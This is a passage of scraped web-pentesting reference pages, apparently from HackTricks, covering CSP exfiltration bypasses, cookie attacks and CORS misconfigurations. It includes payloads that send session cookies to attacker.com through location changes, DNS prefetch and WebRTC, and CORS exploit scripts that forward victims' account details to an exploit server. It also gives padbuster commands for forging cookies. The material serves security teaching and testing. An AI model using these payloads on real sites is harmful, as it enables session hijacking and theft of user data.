s\nrc=\n/wp-json/wp/v2/users/1?_jsonp=some_attack></script>\nnote that this\nscript\nwill be\nloaded\nbecause it's\nallowed by 'self'\n. Moreover, and because WordPress is installed, an attacker might abuse the\nSOME attack\nthrough the\nvulnerable\ncallback\nendpoint that\nbypasses the CSP\nto give more privileges to a user, install a new plugin...\nFor more information about how to perform this attack check\nhttps://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/\n‚Äã\nCSP Exfiltration Bypasses\nIf there is a strict CSP that doesn't allow you to\ninteract with external servers\n, there are some things you can always do to exfiltrate the information.\nLocation\nYou could just update the location to send to the attacker's server the secret information:\nvar\nsessionid\n=\ndocument\n.\ncookie\n.\nsplit\n(\n'='\n)[\n1\n]\n+\n\".\"\n;\ndocument\n.\nlocation\n=\n\"https://attacker.com/?\"\n+\nsessionid\n;\nMeta tag\nYou could redirect by injecting a meta tag (this is just a redirect, this won't leak content)\n<\nmeta\nhttp-equiv\n=\n\"\nrefresh\n\"\ncontent\n=\n\"\n1; http://attacker.com\n\"\n>\nDNS Prefetch\nTo load pages faster, browsers are going to pre-resolve hostnames into IP addresses and cache them for later usage.\nYou can indicate a browser to pre-resolve a hostname with:\n<link reol=\"dns-prefetch\" href=\"something.com\">\nYou could abuse this behaviour to\nexfiltrate sensitive information via DNS requests\n:\nvar\nsessionid\n=\ndocument\n.\ncookie\n.\nsplit\n(\n'='\n)[\n1\n]\n+\n\".\"\n;\nvar\nbody\n=\ndocument\n.\ngetElementsByTagName\n(\n'body'\n)[\n0\n];\nbody\n.\ninnerHTML\n=\nbody\n.\ninnerHTML\n+\n\"<link rel=\\\"dns-prefetch\\\" href=\\\"//\"\n+\nsessionid\n+\n\"attacker.ch\\\">\"\n;\nAnother way:\nconst\nlinkEl\n=\ndocument\n.\ncreateElement\n(\n'link'\n);\nlinkEl\n.\nrel\n=\n'prefetch'\n;\nlinkEl\n.\nhref\n=\nurlWithYourPreciousData\n;\ndocument\n.\nhead\n.\nappendChild\n(\nlinkEl\n);\nIn order to avoid this from happening the server can send the HTTP header:\nX-DNS-Prefetch-Control: off\nApparently, this technique doesn't work in headless browsers (bots)\nWebRTC\nOn several pages you can read that\nWebRTC doesn't check the\nconnect-src\npolicy\nof the CSP.\nActually you can\nleak\ninformations using a\nDNS request\n. Check out this code:\n(\nasync\n()\n=>\n{\np\n=\nnew\nRTCPeerConnection\n({\niceServers\n:\n[{\nurls\n:\n\"stun:LEAK.dnsbin\"\n}]});\np\n.\ncreateDataChannel\n(\n''\n);\np\n.\nsetLocalDescription\n(\nawait\np\n.\ncreateOffer\n())})()\nAnother option:\nvar\npc\n=\nnew\nRTCPeerConnection\n({\n\"iceServers\"\n:\n[\n{\n\"urls\"\n:\n[\n\"turn:74.125.140.127:19305?transport=udp\"\n],\n\"username\"\n:\n\"_all_your_data_belongs_to_us\"\n,\n\"credential\"\n:\n\".\"\n}]\n});\npc\n.\ncreateOffer\n().\nthen\n((\nsdp\n)\n=>\npc\n.\nsetLocalDescription\n(\nsdp\n);\nChecking CSP Policies Online\n‚Äã\nhttps://csp-evaluator.withgoogle.com/\n‚Äã\n‚Äã\nhttps://cspvalidator.org/\n‚Äã\nAutomatically creating CSP\n‚Äã\nhttps://csper.io/docs/generating-content-security-policy\n‚Äã\nReferences\n‚Äã\nhttps://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/\n‚Äã\n‚Äã\nhttps://lcamtuf.coredump.cx/postxss/\n‚Äã\n‚Äã\nhttps://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d\n‚Äã\n‚Äã\nhttps://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme\n‚Äã\n‚Äã\nhttps://www.youtube.com/watch?v=MCyPuOWs3dg\n‚Äã\n‚Äã\nhttps://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/\n‚Äã\n‚Äã\nHackenProof is home to all crypto bug bounties.\nGet rewarded without delays\nHackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.\nGet experience in web3 pentesting\nBlockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.\nBecome the web3 hacker legend\nGain reputation points with each verified bug and conquer the top of the weekly leaderboard.\n‚Äã\nSign up on HackenProof\nstart earning from your hacks!\nHackenProof\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPentesting Web -\nPrevious\nCommand Injection\nNext\nCSP bypass: self + 'unsafe-inline' with Iframes\nLast modified\n19d ago"
    },
    {
        "title": "Cookies Hacking",
        "url": "https://book.hacktricks.xyz/pentesting-web/hacking-with-cookies",
        "text": "Cookies Hacking\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nFind vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems.\nTry it for free\ntoday.\nIntruder | An Effortless Vulnerability Scanner\nCookies Attributes\nExpires & Max-Age\nExpires\nsets an expiry date for when a cookie gets deleted\nMax-age\nsets the time in seconds for when a cookie will be deleted\n(use this, it‚Äôs no longer 2009)\nDomain\nThe\nDomain\nattribute specifies\nwhich hosts can receive a cookie\n. If unspecified, the attribute\ndefaults\nto the\nsame host\nthat set the cookie,\nexcluding subdomains\n.\nIf\nDomain\nis\nspecified\n, then\nsubdomains are always included\n. Therefore, specifying\nDomain\nis less restrictive than omitting it. However, it can be helpful when subdomains need to share information about a user.\nFor example, if you set\nDomain=mozilla.org\n, cookies are available on subdomains like\ndeveloper.mozilla.org\n. But if you don't, the cookie won't be sent to subdomains.\nIf a\nsubdomain\nsub.example.com\nsets a cookie\nwith\ndomain\nattribute of\n.example.com\n, it will be\nsent\non requests to the\nparent domain.\nPath\nThe\nPath\nattribute indicates a\nURL path that must exist in the requested URL to send the\nCookie\nheader\n. The\n%x2F\n(\"/\") character is considered a directory separator, and subdirectories match as well.\nOrder\nWhen 2 cookies have the\nsame name\nthe one that is sent is:\nThe one with the\nlongest path\nmatching the URL path\nThe\nnewest\none if both have the same path\nSameSite\nThis will indicate to the browser if the\ncookie\ncan be sent\nfrom other domains\n. It has 3 possible values:\nStrict\n: The cookie will not be sent along with a request by third party websites.\nLax\n: The cookie will be sent along with the GET request initiated by third party websites.\nNone\n: The cookie is sent from any third party domain\nRequest Type\nExample Code\nCookies Sent When\nLink\n<a href=\"...\"></a>\nNotSet*, Lax, None\nPrerender\n<link rel=\"prerender\" href=\"..\"/>\nNotSet*, Lax, None\nForm GET\n<form method=\"GET\" action=\"...\">\nNotSet*, Lax, None\nForm POST\n<form method=\"POST\" action=\"...\">\nNotSet*, None\niframe\n<iframe src=\"...\"></iframe>\nNotSet*, None\nAJAX\n$.get(\"...\")\nNotSet*, None\nImage\n<img src=\"...\">\nNetSet*, None\nTable from\nInvicti\nand slightly modified.\nA cookie with\nSameSite\nattribute will\nmitigate CSRF attacks\nwhere a logged session is needed.\n*Notice that from Chrome80 (feb/2019) the default behaviour of a cookie without a cookie samesite\nattribute will be lax\n(\nhttps://www.troyhunt.com/promiscuous-cookies-and-their-impending-death-via-the-samesite-policy/\n).\nNotice that temporary, after applying this change, the\ncookies without a SameSite\npolicy\nin Chrome will be\ntreated as None\nduring the\nfirst 2 minutes and then as Lax for top-level cross-site POST request.\nCookies Flags\nHttpOnly\nThis avoids the\nclient\nto access the cookie (Via\nJavascript\nfor example:\ndocument.cookie\n)\nBypasses\nIf the page is\nsending the cookies as the response\nof a requests (for example in a\nPHPinfo\npage), it's possible to abuse the XSS to send a request to this page and\nsteal the cookies\nfrom the response (check an example in\nhttps://hackcommander.github.io/pentesting-article-1/)\n‚Äã\nThis could be Bypassed with\nTRACE\nHTTP\nrequests as the response from the server (if this HTTP method is available) will reflect the cookies sent. This technique is called\nCross-Site Tracking\n.\nThis technique is avoided by\nmodern browsers by not permitting sending a TRACE\nrequest from JS. However, some bypasses to this have been found in specific software like sending\n\\r\\nTRACE\ninstead of\nTRACE\nto IE6.0 SP2.\nAnother way is the exploitation of zero/day vulnerabilities of the browsers.\nIt's possible to\noverwrite HttpOnly cookies\nby performing a Cookie Jar overflow attack:\nCookie Jar Overflow\nIt's possible to use\nCookie Smuggling\nattack to exfiltrate these cookies\nSecure\nThe request will\nonly\nsend the cookie in an HTTP request only if the request is transmitted over a secure channel (typically\nHTTPS\n).\nCookies Prefixes\n__Secure-\nprefix\n: must be set with the\nsecure\nflag from a secure page (HTTPS).\n__Host-\nprefix\n: must be set with the\nsecure\nflag, must be from a secure page (HTTPS), must not have a domain specified (and therefore, are not sent to subdomains), and the path must be\n/\n.\n__Host-\nprefixed cookies cannot be sent to superdomains (cookies from subdomains to domains) or subdomains (cookies from domains to subdomains), so, if you want to isolate your application cookies, prefixing everything with\n__Host-\nis not a bad idea.\nCookies Attacks\nIf you find some kind of custom cookie containing sensitive data (sessionID, username, emails, etc.) you should definitely try to exploit it\nDecoding the cookie\nIf the\ncookie\nis using some\nBase encoding\n(like Base64) or similar you may be able to\ndecode it\n,\nchange\nthe\ncontent\nand\nimpersonate\narbitrary users.\nSession Hijacking\nSteal a cookie and use it to impersonate the user inside an application\nSession fixation\nThe attacker gets a cookie from a web page and sends a link to the victim to\nlogin using the very same cookie\n. If the cookie is not changed when a user logs in, this could be useful because the attacker could be able to impersonate the user through a cookie.\nIf you found an\nXSS in a subdomain\nor you\ncontrol a subdomain\n, read:\nCookie Tossing\nSession donation\nThe attacker sends his own session to the victim. The victim will see that he is already logged in and will suppose that he is inside his account but\nthe actions will be performed inside the attacker's account\n.\nIf you found an\nXSS in a subdomain\nor you\ncontrol a subdomain\n, read:\nCookie Tossing\n‚Äã\nJWT Cookie\n‚Äã\nClick on the previous link to access a page explaining possible flaws in JWT.\nEmpty Cookie\nBrowsers allow a cookie with an empty name\ndocument\n.\ncookie\n=\n\"a=v1\"\ndocument\n.\ncookie\n=\n\"=test value;\"\n// empty name\ndocument\n.\ncookie\n=\n\"b=v2\"\nThis results in the sent cookie header:\na=v1; test value; b=v2;\nMore interestingly, if you have a vector that somehow lets you\nset the empty cookie\n, you can\ncontrol any other cookie\n:\nfunction\nsetCookie\n(\nname\n,\nvalue\n)\n{\ndocument\n.\ncookie\n=\n`\n${\nname\n}\n=\n${\nvalue\n}\n`\n;\n}\n‚Äã\nsetCookie\n(\n\"\"\n,\n\"a=b\"\n);\n// this sets the empty cookie to a=b\nAlthough internally in the browser, this is set as the empty named cookie, it will result in the\nsent cookie header:\na=b;\nMeaning, every webserver will parse it as the cookie\na\nbeing set to the value\nb\n.\nChrome Bug - document.cookie corruption\nIf a unicode surrogate codepoint is in a set cookie,\ndocument.cookie\nwill be permanently corrupted and return an empty string.\ndocument\n.\ncookie\n// \"a=b;\"\ndocument\n.\ncookie\n=\n\"\\ud800=meep\"\n;\ndocument\n.\ncookie\n// \"\"\nCookie Smuggling\nSeveral webservers, including Java webservers Jetty, TomCat, Undertow, and the Python web framework Zope, as well as Python web servers/frameworks like cherrypy, web.py, aiohttp server, bottle, and webob, are found to\nincorrectly parse cookie strings\ndue to leftover support for RFC2965, an outdated cookie quoting mechanism that uses RFC2616 for a quoted-string definition.\nSpecifically,\nthese servers continue reading a cookie string when they encounter a double-quoted (dquoted) cookie value, even if a semicolon is encountered\n. This is problematic because\nsemicolons are supposed to separate key-value\npairs in the cookie string.\nFor instance, if a\nbrowser sends three cookies, RENDER_TEXT, JSESSIONID,\nand\nASDF:\nRENDER_TEXT\n=\n\"hello world; JSESSIONID=13371337; ASDF=end\"\n;\nthese servers interpret them as part of a\nsingle cookie value\nrather than three separate cookies.\nThis leads to a security risk: if an attacker gains cross-site scripting (XSS) access, they can use this bug to\nexfiltrate sensitive cookies like HttpOnly cookies\n.\nCookie Injection\nMany webservers, including Java's Undertow, Python's Zope, and those using Python's stdlib http.cookie.SimpleCookie and http.cookie.BaseCookie, have been found to\nincorrectly parse cookies, using wrong delimiters to start the next cookie name/value pair\n. This allows an attacker to\nspoof multiple cookies while only controlling one cookie value\n.\nIn\nUndertow's\ncase, it begins parsing the next cookie immediately after the\nend of a quoted\ncookie value, without waiting for a semicolon:\nLANGUAGE\n=\n\"en-us\"\nCSRF_TOKEN\n=\n\"SPOOFED_VALUE\"\nZope\nstart parsing the next cookie on a\ncomma\n:\nLANGUAGE\n=\nen-us,CSRF_TOKEN\n=\nSPOOFED_VALUE\nAnd\nPython's SimpleCookie\nand\nBaseCookie\nimmediately start parsing the next cookie on a\nspace\ncharacter:\nLANGUAGE=en-us CSRF_TOKEN=SPOOFED_VALUE\nAs a result, servers such as\ncherrypy\n,\nweb.py\n,\naiohttp\nserver,\nbottle\n, and\nwebob\n(Pyramid, TurboGears) are all vulnerable to this type of attack.\nThis issue presents significant\nsecurity implications\n. For instance, if a web application uses\ncookie-based CSRF protection\n, an attacker can\ninject\na spoofed\nCSRF-token cookie\nto bypass this protection. Additionally, the last duplicate cookie name in Python's http.cookie packages overrides any previous ones, making this type of attack especially easy.\nFurthermore, the\nspoofing\nof\n__Secure-\nand\n__Host-\ncookies can be abused in an insecure context. Also, in a configuration where cookies are passed onto a backend server,\ncookie injection could lead to authorization bypasses\nif the backend server is susceptible to spoofing but the frontend server is not.\nExtra Vulnerable Cookies Checks\nBasic checks\nThe\ncookie\nis the\nsame\nevery time you\nlogin\n.\nLog out and try to use the same cookie.\nTry to log in with 2 devices (or browsers) to the same account using the same cookie.\nCheck if the cookie has any information in it and try to modify it\nTry to create several accounts with almost the same username and check if you can see similarities.\nCheck the \"\nremember me\n\" option if it exists to see how it works. If it exists and could be vulnerable, always use the cookie of\nremember me\nwithout any other cookie.\nCheck if the previous cookie works even after you change the password.\nAdvanced cookies attacks\nIf the cookie remains the same (or almost) when you log in, this probably means that the cookie is related to some field of your account (probably the username). Then you can:\nTry to create a lot of\naccounts\nwith usernames very\nsimilar\nand try to\nguess\nhow the algorithm is working.\nTry to\nbruteforce the username\n. If the cookie saves only as an authentication method for your username, then you can create an account with username \"\nBmin\n\" and\nbruteforce\nevery single\nbit\nof your cookie because one of the cookies that you will try will the one belonging to \"\nadmin\n\".\nTry\nPadding\nOracle\n(you can decrypt the content of the cookie). Use\npadbuster\n.\nPadding Oracle - Padbuster examples\npadbuster\n<\nURL/path/when/successfully/login/with/cookie\n>\n<\nCOOKIE\n>\n<\nPAD\n[\n8\n-16\n]\n>\n# When cookies and regular Base64\npadbuster http://web.com/index.php u7bvLewln6PJPSAbMb5pFfnCHSEd6olf\n8\n-cookies\nauth\n=\nu7bvLewln6PJPSAbMb5pFfnCHSEd6olf\n‚Äã\n# If Base64 urlsafe or hex-lowercase or hex-uppercase --encoding parameter is needed, for example:\npadBuster http://web.com/home.jsp?\nUID\n=\n7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6\n7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6\n8\n-encoding\n2\nPadbuster will make several attempts and will ask you which condition is the error condition (the one that is not valid).\nThen it will start decrypting the cookie (it may take several minutes)\nIf the attack has been successfully performed, then you could try to encrypt a string of your choice. For example, if you would want to\nencrypt\nuser=administrator\npadbuster http://web.com/index.php 1dMjA5hfXh0jenxJQ0iW6QXKkzAGIWsiDAKV3UwJPT2lBP+zAD0D0w== 8 -cookies thecookie=1dMjA5hfXh0jenxJQ0iW6QXKkzAGIWsiDAKV3UwJPT2lBP+zAD0D0w== -plaintext user=administrator\nThis execution will give you the cookie correctly encrypted and encoded with the string\nuser=administrator\ninside.\nCBC-MAC\nMaybe a cookie could have some value and could be signed using CBC. Then, the integrity of the value is the signature created by using CBC with the same value. As it is recommended to use as IV a null vector, this type of integrity checking could be vulnerable.\nThe attack\n1.\nGet the signature of username\nadminist\n=\nt\n2.\nGet the signature of username\nrator\\x00\\x00\\x00 XOR t\n=\nt'\n3.\nSet in the cookie the value\nadministrator+t'\n(\nt'\nwill be a valid signature of\n(rator\\x00\\x00\\x00 XOR t) XOR t\n=\nrator\\x00\\x00\\x00\nECB\nIf the cookie is encrypted using ECB it could be vulnerable.\nWhen you log in the cookie that you receive has to be always the same.\nHow to detect and attack:\nCreate 2 users with almost the same data (username, password, email, etc.) and try to discover some pattern inside the given cookie\nCreate a user called for example \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\" and check if there is any pattern in the cookie (as ECB encrypts with the same key every block, the same encrypted bytes could appear if the username is encrypted).\nThere should be a pattern (with the size of a used block). So, knowing how are a bunch of \"a\" encrypted you can create a username: \"a\"*(size of the block)+\"admin\". Then, you could delete the encrypted pattern of a block of \"a\" from the cookie. And you will have the cookie of the username \"admin\".\nReferences\n‚Äã\nhttps://blog.ankursundara.com/cookie-bugs/\n‚Äã\nFind vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems.\nTry it for free\ntoday.\nIntruder | An Effortless Vulnerability Scanner\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nCSP bypass: self + 'unsafe-inline' with Iframes\nNext\nCookie Tossing\nLast modified\n2mo ago"
    },
    {
        "title": "CORS - Misconfigurations & Bypass",
        "url": "https://book.hacktricks.xyz/pentesting-web/cors-bypass",
        "text": "CORS - Misconfigurations & Bypass\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nWhat is CORS?\nThe CORS (Cross-origin resource sharing) standard is needed because it\nallows servers to specify who can access its assets\nand which\nHTTP request methods are allowed\nfrom external resources.\nA\nsame-origin\npolicy, requiers that both the\nserver requesting\na resource and the server where the\nresource\nis located uses the same protocol (\nhttp://),domain\nname (internal-web.com) and the same\nport\n(80). Then, if the server forces the same-origin policy, only web pages from the same domain and port will be able to access the resources.\nThe following table shows how the same-origin policy will be applied in\nhttp://normal-website.com/example/example.html\n:\nURL accessed\nAccess permitted?\nhttp://normal-website.com/example/\nYes: same scheme, domain, and port\nhttp://normal-website.com/example2/\nYes: same scheme, domain, and port\nhttps://normal-website.com/example/\nNo: different scheme and port\nhttp://en.normal-website.com/example/\nNo: different domain\nhttp://www.normal-website.com/example/\nNo: different domain\nhttp://normal-website.com:8080/example/\nNo: different port*\n*\nInternet Explorer will allow this access because IE does not take account of the port number when applying the same-origin policy.\nAccess-Control-Allow-Origin\nHeader\nThe specification of\nAccess-Control-Allow-Origin\nallows for\nmultiple origins\n, or the value\nnull\n, or the wildcard\n*\n. However,\nno browser supports multiple origins\nand there are\nrestrictions\non the use of the\nwildcard\n*\n.(\nThe wildcard can only be used alone, this will fail\nAccess-Control-Allow-Origin: https://*.normal-website.com\nand it cannot be used with\nAccess-Control-Allow-Credentials: true\n)\nThis header is\nreturned by a server\nwhen a website requests a cross-domain resource, with an\nOrigin\nheader added by the browser.\nAccess-Control-Allow-Credentials\nHeader\nThe\ndefault\nbehaviour of cross-origin resource requests is for\nrequests\nto be\npassed without credentials\nlike cookies and the Authorization header. However, the cross-domain server can\npermit reading\nof the\nresponse\nwhen\ncredentials\nare\npassed\nto it by setting the CORS\nAccess-Control-Allow-Credentials\nheader to\ntrue\n.\nIf the value is set to\ntrue\nthen the browser will send credentials (cookies, authorization headers or TLS client certificates).\nvar\nxhr\n=\nnew\nXMLHttpRequest\n();\nxhr\n.\nonreadystatechange\n=\nfunction\n()\n{\nif\n(\nxhr\n.\nreadyState\n===\nXMLHttpRequest\n.\nDONE\n&&\nxhr\n.\nstatus\n===\n200\n)\n{\nconsole\n.\nlog\n(\nxhr\n.\nresponseText\n);\n}\n}\nxhr\n.\nopen\n(\n'GET'\n,\n'http://example.com/'\n,\ntrue\n);\nxhr\n.\nwithCredentials\n=\ntrue\n;\nxhr\n.\nsend\n(\nnull\n);\nfetch\n(\nurl\n,\n{\ncredentials\n:\n'include'\n})\nconst\nxhr\n=\nnew\nXMLHttpRequest\n();\nxhr\n.\nopen\n(\n'POST'\n,\n'https://bar.other/resources/post-here/'\n);\nxhr\n.\nsetRequestHeader\n(\n'X-PINGOTHER'\n,\n'pingpong'\n);\nxhr\n.\nsetRequestHeader\n(\n'Content-Type'\n,\n'application/xml'\n);\nxhr\n.\nonreadystatechange\n=\nhandler\n;\nxhr\n.\nsend\n(\n'<person><name>Arun</name></person>'\n);\nPre-flight request\nUnder certain circumstances, when a cross-domain request:\nincludes a\nnon-standard HTTP method (HEAD, GET, POST)\nincludes new\nheaders\nincludes special\nContent-Type header value\nCheck\nin this link\nthe conditions of a request to avoid sending of a pre-flight request\nthe cross-origin request is preceded by a\nrequest\nusing the\nOPTIONS\nmethod\n, and the CORS protocol necessitates an initial check on what\nmethods and headers are permitted prior to allowing the cross-origin request\n. This is called the\npre-flight check\n. The server\nreturns a list of allowed methods\nin addition to the\ntrusted origin\nand the browser checks to see if the requesting website's method is allowed.\nNote that\neven if a pre-flight request isn't sent\nbecause the \"regular request\" conditions are respected, the\nresponse needs to have the authorization headers\nor the\nbrowser\nwon't be able to read the response\nof the request.\nFor\nexample\n, this is a pre-flight request that is seeking to\nuse the\nPUT\nmethod\ntogether with a\ncustom\nrequest\nheader\ncalled\nSpecial-Request-Header\n:\nOPTIONS /data HTTP/1.1\nHost: <some website>\n...\nOrigin: https://normal-website.com\nAccess-Control-Request-Method: PUT\nAccess-Control-Request-Headers: Special-Request-Header\nThe server might return a response like the following:\nHTTP/1.1 204 No Content\n...\nAccess-Control-Allow-Origin: https://normal-website.com\nAccess-Control-Allow-Methods: PUT, POST, OPTIONS\nAccess-Control-Allow-Headers: Special-Request-Header\nAccess-Control-Allow-Credentials: true\nAccess-Control-Max-Age: 240\nAccess-Control-Allow-Headers\nAllowed headers\nAccess-Control-Expose-Headers\nAccess-Control-Max-Age\nDefines a maximum timeframe for caching the pre-flight response for reuse\nAccess-Control-Request-Headers\nThe header the cross-origin request wants to send\nAccess-Control-Request-Method\nThe method the cross-origin request wants to use\nOrigin\nOrigin of the cross-origin request (Set automatically by the browser)\nNote that usually (depending on the content-type and headers set) in a\nGET/POST request no pre-flight request is sent\n(the request is sent\ndirectly\n), but if you want to access the\nheaders/body of the response\n, it must contains an\nAccess-Control-Allow-Origin\nheader allowing it.\nTherefore, CORS doesn't protect against CSRF (but it can be helpful).\nLocal Network Requests Pre-flight request\nWhen a request is sent to a local network IP address, 2 additional CORS headers are sent:\nThe\nAccess-Control-Request-Local-Network\nclient request header indicates that the request is a local network request\nThe\nAccess-Control-Allow-Local-Network\nserver response header indicates that a resource can be safely shared with external networks\nA\nvalid response allowing the local network request\nneeds to have also in the response the header\nAccess-Controls-Allow-Local_network: true\n:\nHTTP/1.1 200 OK\n...\nAccess-Control-Allow-Origin: https://public.example.com\nAccess-Control-Allow-Methods: GET\nAccess-Control-Allow-Credentials: true\nAccess-Control-Allow-Local-Network: true\nContent-Length: 0\n...\nNote that the linux\n0.0.0.0\nIP works to\nbypass\nthese requirements to access localhost as that IP address is not considered \"local\".\nIt's also possible to\nbypass the Local Network requirements\nif you use the\npublic IP address of a local endpoint\n(like the public IP of the router). Because in several occations, even if the\npublic IP\nis being accessed, if it's\nfrom the local network\n, access will be granted.\n‚Äã\nExploitable misconfigurations\nNotice that most of the\nreal attacks require\nAccess-Control-Allow-Credentials\nto be set to\ntrue\nbecause this will allow the browser to send the credentials and read the response. Without credentials, many attacks become irrelevant; it means you can't ride on a user's cookies, so there is often nothing to be gained by making their browser issue the request rather than issuing it yourself.\nOne notable exception is when the\nvictim's network location functions as a kind of authentication.\nYou can use a victim‚Äôs browser as a proxy to bypass IP-based authentication and access intranet applications. In terms of impact this is similar to DNS rebinding, but much less fiddly to exploit.\nReflected\nOrigin\nin\nAccess-Control-Allow-Origin\nIn the real world this cannot happen as\nthese 2 values of the headers are forbidden together\n.\nIt is also true that a lot of developers want to\nallow several URLs in the CORS\n, but subdomain wildcards or lists of URLs aren't allowed. Then, several developers\ngenerate\nthe **\nAccess-Control-Allow-Origin\n**header\ndynamically\n, and in more than one occasion they just\ncopy the value of the Origin header\n.\nIn that case, the\nsame vulnerability might be exploited.\nIn other cases, the developer could check that the\ndomain\n(\nvictimdomain.com\n)\nappears\nin the\nOrigin header\n, then, an attacker can use a domain called\nattackervictimdomain.com\nto steal the confidential information.\n<\nscript\n>\nvar\nreq\n=\nnew\nXMLHttpRequest\n();\nreq\n.\nonload\n=\nreqListener\n;\nreq\n.\nopen\n(\n'get'\n,\n'https://acc21f651fde5631c03665e000d90048.web-security-academy.net/accountDetails'\n,\ntrue\n);\nreq\n.\nwithCredentials\n=\ntrue\n;\nreq\n.\nsend\n();\n‚Äã\nfunction\nreqListener\n()\n{\nlocation\n=\n'/log?key='\n+\nthis\n.\nresponseText\n;\n};\n</\nscript\n>\nThe\nnull\nOrigin\nnull\nis a special value for the\nOrigin\nheader. The specification mentions it being triggered by redirects, and local HTML files. Some applications might whitelist the\nnull\norigin to support local development of the application.\nThis is nice because\nseveral application will allow this value\ninside the CORS and any\nwebsite can easily obtain the null origin using a sandboxed iframe\n:\n<\niframe\nsandbox\n=\n\"\nallow-scripts allow-top-navigation allow-forms\n\"\nsrc\n=\n\"\ndata:text/html,<script>\nvar req = new XMLHttpRequest();\nreq.onload = reqListener;\nreq.open('get','https://acd11ffd1e49837fc07b373a00eb0047.web-security-academy.net/accountDetails',true);\nreq.withCredentials = true;\nreq.send();\nfunction reqListener() {\nlocation='https://exploit-accd1f8d1ef98341c0bc370201c900f2.web-security-academy.net//log?key='+encodeURIComponent(this.responseText);\n};\n</script>\n\"\n>\n</\niframe\n>\n<\niframe\nsandbox\n=\n\"\nallow-scripts allow-top-navigation allow-forms\n\"\nsrcdoc\n=\n\"\n<script>\nvar req = new XMLHttpRequest();\nreq.onload = reqListener;\nreq.open('get','https://acd11ffd1e49837fc07b373a00eb0047.web-security-academy.net/accountDetails',true);\nreq.withCredentials = true;\nreq.send();\nfunction reqListener() {\nlocation='https://exploit-accd1f8d1ef98341c0bc370201c900f2.web-security-academy.net//log?key='+encodeURIComponent(this.responseText);\n};\n</script>\n\"\n>\n</\niframe\n>\nRegexp bypasses\nIf you found the domain\nvictim.com\nto be\nwhitelisted\nyou should check if\nvictim.com.\nattacker.com\nis\nwhitelisted also\n, or, in case you can\ntakeover some subdomain\n, check if\nsomesubdomain\n.victim.com\nis whitelisted.\nAdvance Regexp bypasses\nMost of the regex used to identify the domain inside the string will focus on alphanumeric ASCII characters and\n.-\n. Then, something like\nvictimdomain.com{.attacker.com\ninside the Origin header will be interpreted by the regexp as if the domain was\nvictimdomain.com\nbut the browser (in this case Safari supports this character in the domain) will access the domain\nattacker.com\n.\nThe\n_\ncharacter (in subdomains) is not only supported in Safari, but also in Chrome and Firefox!\nThen, using one of those subdomains you could bypass some \"common\" regexps to find the main domain of a URL.\nFor more information and settings of this bypass 